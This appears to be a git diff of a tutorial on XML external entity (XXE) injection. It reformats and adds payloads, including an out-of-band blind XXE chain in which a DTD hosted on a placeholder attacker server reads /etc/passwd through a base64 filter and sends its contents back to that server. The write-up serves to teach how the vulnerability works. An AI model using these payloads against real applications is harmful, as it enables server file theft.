@@ -32,7 +32,10 @@ For ex you have a url with a parameter that parses XML data somthing like this:-
 
 Now when you provide any xml data, and that data is printing back to the user's browser then you can try basic XXE. You have to confirm the vulnerability existence and this can be done by something like this.
 
-Payload:- `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'http://yourserverip/'>]><root>&test;</root>`
+Payload 1:- `<?xml version="1.0"?>`
+`<!DOCTYPE root [`
+`<!ENTITY test SYSTEM 'http://yourserverip/'>]>`
+`<root>&test;</root>`
 
 Now let's understand this. 
 
@@ -60,11 +63,14 @@ Still you can confirm the existence of the vulnerability by using the first payl
 
 So we also needed to blind means we have to use blind payload which will grep the contents of the local files of the webserver and send the contents to our server. Sound interesting, let's see how this whole theory works and also let's see that if we have some alternatives to do that.
 
-Payload:- `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % test SYSTEM 'http://yourserver/xml.dtd'> %test; %exe]><root>&entity;</root>`
+Payload 2:- `<?xml version="1.0"?>`
+`<!DOCTYPE root [`
+`<!ENTITY % test SYSTEM 'http://yourserver/xml.dtd'> %test; %exe]>`
+`<root>&entity;</root>`
 
 Your xml.dtd contents:- 
 
-`<!ENTITY % file SYSTEM "php://filter/convert/base64.encode/resource=/etc/passwd">`
+`<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">`
 `<!ENTIY % exe "<!ENTITY entity SYSTEM 'http://yourserver/%file;'>">`
 
 Lot's of code to understand:-
@@ -79,8 +85,26 @@ Lot's of code to understand:-
 
 Make sense?
 
-Let's see the demo below.
+Let's see how all this works.
 
 <video src="/bandicam 2018-11-04 23-35-26-024.mp4" width="320" height="200" controls preload></video>
+
+Cool. 
+
+Now, Have anyone arise a question that why we call the dtd from attacker's server? Why not this below payload works?
+
+Payload 3:- `<?xml version="1.0"?>`
+`<!DOCTYPE root [`
+`<!ENTITY % filecontents SYSTEM 'file:///etc/passwd>`
+`<!ENTITY test SYSTEM 'http://yourserver/%filecontents;'>]>`
+`<root>&test;</root>`
+
+this would be easier than before? Yes it is, but it is not going to work. 
+
+**Actually parameter entity can't be called inside the DTD subset they can be called in the External subset (like we did in Payload no 2. It will be forbidden, hence you will get the forbidden error.**
+
+So that's the reason why we can't run above payload.
+
+
 
 
